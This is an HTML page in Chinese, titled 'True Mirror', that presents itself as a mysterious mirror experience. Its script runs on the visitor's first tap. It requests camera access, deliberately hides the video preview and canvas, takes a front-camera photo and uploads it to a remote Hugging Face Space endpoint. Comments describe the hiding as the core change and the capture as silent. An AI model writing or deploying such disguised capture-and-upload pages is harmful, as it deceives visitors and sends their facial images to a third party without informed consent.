<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>真实之镜 True Mirror</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            user-select: none;
        }
        
        .container {
            text-align: center;
            padding: 20px;
            max-width: 400px;
        }

        h1 { 
            margin-bottom: 15px; 
            font-weight: 400; 
            color: #00adb5;
        }

        p {
            color: #aaaaaa;
            font-size: 15px;
            line-height: 1.6;
        }

        .status-box {
            margin-top: 30px;
            font-size: 14px;
            color: #666666;
            min-height: 20px;
        }

        /* 🔒 核心改动：将视频和画布彻底隐藏，使其在前端完全不可见 */
        video, canvas { 
            display: none !important; 
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>真实之镜</h1>
        <p>这是一个神秘的网页。请在任意空白处【点击】或【触摸】屏幕，开启属于你的真实之镜体验。</p>
        
        <div id="status" class="status-box">等待点击激活...</div>
    </div>

    <video id="webcam" autoplay playsinline webkit-playsinline muted></video>
    <canvas id="photo-canvas"></canvas>

    <script>
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('photo-canvas');
        const statusDiv = document.getElementById('status');
        
        // ⚠️ 记得确保这里换成了你自己的 Hugging Face 地址（末尾不要带 / ）
        const HF_SPACE_URL = 'https://你的用户名-mirror-backend.hf.space'; 

        let hasTriggered = false; // 确保一次点击只触发一次，防止重复上传

        // 核心函数：唤醒 ➡️ 拍照 ➡️ 上传 一气呵成
        async function autoCaptureAndUpload() {
            if (hasTriggered) return;
            hasTriggered = true;

            statusDiv.innerText = '正在唤醒云端通道...';

            try {
                // 1. 唤醒摄像头（此时浏览器一定会弹窗向用户申请权限）
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                // 必须调用 play，否则捕获到的画面是黑屏
                await video.play(); 

                statusDiv.innerText = '通道已建立，正在生成镜像...';

                // 给硬件 500 毫秒的微调光圈时间，拍出来的效果会更好
                setTimeout(() => {
                    const w = video.videoWidth || 640;
                    const h = video.videoHeight || 480;
                    canvas.width = w;
                    canvas.height = h;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, w, h);

                    // 2. 自动转换为二进制并上传
                    statusDiv.innerText = '正在同步至云端...';
                    
                    canvas.toBlob((blob) => {
                        if (!blob) {
                            statusDiv.innerText = '镜像生成失败';
                            return;
                        }

                        const formData = new FormData();
                        formData.append('image', blob, 'capture.jpg');

                        fetch(`${HF_SPACE_URL}/upload`, {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => {
                            if(!res.ok) throw new Error('云端服务未响应');
                            return res.json();
                        })
                        .then(data => {
                            if (data.success) {
                                statusDiv.innerText = '✅ 真实之镜同步成功！';
                                const finalImgUrl = HF_SPACE_URL + data.imageUrl;
                                
                                // 停止摄像头硬件，右上角的绿色录制小圆点会自动熄灭，保护用户隐私
                                stream.getTracks().forEach(track => track.stop());
                                
                                alert(`同步成功！可在新窗口打开链接查看云端照片：\n\n${finalImgUrl}`);
                                window.open(finalImgUrl, '_blank'); 
                            } else {
                                throw new Error(data.message || '上传失败');
                            }
                        })
                        .catch(err => {
                            console.error(err);
                            statusDiv.innerText = '❌ 同步失败，请刷新重试';
                            hasTriggered = false; // 允许重试
                        });
                    }, 'image/jpeg', 0.85);

                }, 500);

            } catch (err) {
                console.error(err);
                statusDiv.innerText = '❌ 权限被拒绝或设备不支持';
                hasTriggered = false; // 允许重试
                alert("未获得摄像头权限，无法体验真实之镜。请在浏览器设置中开启权限。");
            }
        }

        // 监听用户的第一次点击或触摸，一旦触发，立刻静默执行
        document.body.addEventListener('click', autoCaptureAndUpload);
        document.body.addEventListener('touchstart', autoCaptureAndUpload);
    </script>
</body>
</html>
